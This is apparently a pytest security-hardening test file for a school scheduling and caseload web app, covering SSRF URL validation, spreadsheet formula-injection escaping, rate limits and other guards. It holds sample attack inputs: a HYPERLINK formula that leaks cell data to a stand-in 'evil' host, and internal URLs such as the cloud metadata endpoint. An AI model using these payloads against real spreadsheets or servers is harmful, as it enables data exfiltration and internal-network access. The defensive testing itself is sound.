"""Phase-3 hardening: SSRF, formula injection, rate limits, index sweep.

Each of these was a verified finding where the naive fix would have broken
something, so the tests pin the *shape* of the fix, not just its presence.
"""
import io
from pathlib import Path

import pytest

from app import db
from app.utils.networking import is_loopback
from app.utils.security import validate_external_url, xlsx_safe

ROOT = Path(__file__).resolve().parent.parent


# ------------------------------------------------------------------ SSRF

@pytest.mark.parametrize('url', [
    'http://169.254.169.254/latest/meta-data/',   # cloud metadata
    'http://127.0.0.1:5000/calendar.ics',
    'http://localhost/calendar.ics',
    'http://192.168.1.10/cal.ics',
    'http://10.0.0.5/cal.ics',
    'http://100.64.0.5/cal.ics',                  # tailnet peer
    'ftp://example.com/cal.ics',                  # wrong scheme
    'https://user:pw@calendar.google.com/x.ics',  # embedded credentials
    '',
])
def test_external_url_rejects_internal_and_malformed(url):
    ok, _ = validate_external_url(url)
    assert ok is False, f'should have been rejected: {url!r}'


def test_external_url_still_allows_a_real_calendar_feed():
    """The guard must NOT be validate_local_url — Google Calendar is public,
    and rejecting public hosts would break every legitimate feed."""
    ok, _ = validate_external_url(
        'https://calendar.google.com/calendar/ical/abc/private-xyz/basic.ics')
    assert ok is True


def test_ical_fetch_revalidates_and_blocks_redirects():
    """Validating only at save time leaves DNS rebinding open, and a 302 can
    relocate the request after the check passes."""
    src = (ROOT / 'app/routes/calendar.py').read_text()
    fetch = src[src.index('def get_external_events'):]
    fetch = fetch[:fetch.index('def _parse_ical_feed')]
    assert 'validate_external_url' in fetch, 'no re-validation at fetch time'
    assert 'allow_redirects=False' in fetch, 'redirects still followed'


# ------------------------------------------------------ formula injection

@pytest.mark.parametrize('payload', [
    '=HYPERLINK("http://evil/?d="&A2,"View")',
    '+1+1', '-1+1', '@SUM(A1:A2)', '\t=1+1', '\r=1+1',
])
def test_xlsx_safe_neutralizes_formula_triggers(payload):
    out = xlsx_safe(payload)
    assert out.startswith("'"), f'{payload!r} left live'


def test_xlsx_safe_preserves_non_text_cell_types():
    """csv_safe() str()s everything, which would turn grade_level 10 into text
    and break sorting/filtering in the workbook."""
    assert xlsx_safe(11) == 11
    assert xlsx_safe(3.5) == 3.5
    assert xlsx_safe(None) is None
    assert xlsx_safe('Maria') == 'Maria'


def test_caseload_export_neutralizes_injected_name(app, make_student):
    from openpyxl import load_workbook
    sid = make_student(grade=11, first_name='=HYPERLINK("http://evil/","x")')
    client = app.test_client()
    client.get('/demo-login')
    r = client.get('/caseload/export')
    assert r.status_code == 200

    ws = load_workbook(io.BytesIO(r.data)).active
    live = [c.value for row in ws.iter_rows() for c in row
            if isinstance(c.value, str) and c.value.startswith('=')]
    assert not live, f'live formulas in the exported workbook: {live}'


# ------------------------------------------------------------ rate limits

def test_public_booking_is_rate_limited(app):
    from app.models.user import User
    with app.app_context():
        token = User.query.filter_by(username='demo').first().get_or_create_feed_token()
    client = app.test_client()
    codes = [client.post(f'/scheduling/book/{token}/confirm',
                         json={'name': 'Spam', 'date': '2026-09-01',
                               'start_time': '09:00'}).status_code
             for _ in range(8)]
    assert 429 in codes, f'never throttled: {codes}'


def test_public_booking_clamps_free_text():
    """These strings are persisted and rendered back into the iCal feed."""
    src = (ROOT / 'app/routes/availability.py').read_text()
    block = src[src.index('def public_confirm_booking'):]
    block = block[:block.index('db.session.add(booking)')]
    assert 'clamp(' in block, 'free-text fields still uncapped'


# ------------------------------------------------------------ misc guards

def test_index_backfill_covers_every_declared_index(app):
    """Was a hand-maintained list of 12 against 81 model-declared indexes, so a
    new index=True column silently got no index on an existing database."""
    from sqlalchemy import inspect as sa_inspect
    with app.app_context():
        declared = {i.name for t in db.metadata.tables.values() for i in t.indexes}
        insp = sa_inspect(db.session.get_bind())
        present = set()
        for table in db.metadata.tables:
            if insp.has_table(table):
                present |= {i['name'] for i in insp.get_indexes(table)}
        missing = declared - present
    assert not missing, f'declared indexes absent from the database: {sorted(missing)}'


def test_network_acl_is_not_limited_to_tailscale_mode():
    """HOST=0.0.0.0 selects 'manual', which used to skip the ACL entirely while
    the banner still claimed the school LAN couldn't see the port."""
    src = (ROOT / 'run.py').read_text()
    guard = src[src.index('_tailscale_guard') - 700:src.index('_tailscale_guard')]
    assert "if mode == 'tailscale':" not in guard, \
        'ACL is still gated on tailscale mode alone'
    assert 'host not in' in guard, 'ACL is not keyed on the actual bind address'


def test_cryptography_not_declared_unused():
    """It was pinned but never imported, implying at-rest encryption that does
    not exist."""
    reqs = (ROOT / 'requirements.txt').read_text()
    declared = [l for l in reqs.splitlines()
                if l.strip().lower().startswith('cryptography')]
    assert not declared, 'unused cryptography pin is back'


def test_full_disk_encryption_is_documented():
    readme = (ROOT / 'README.md').read_text().lower()
    assert 'bitlocker' in readme and 'filevault' in readme


def test_is_loopback_matches_expectations():
    assert is_loopback('127.0.0.1') is True
    assert is_loopback('::1') is True
    assert is_loopback('::ffff:127.0.0.1') is True
    assert is_loopback('100.64.0.5') is False
    assert is_loopback('192.168.1.5') is False
    assert is_loopback('') is False
    assert is_loopback(None) is False
    assert is_loopback('garbage') is False
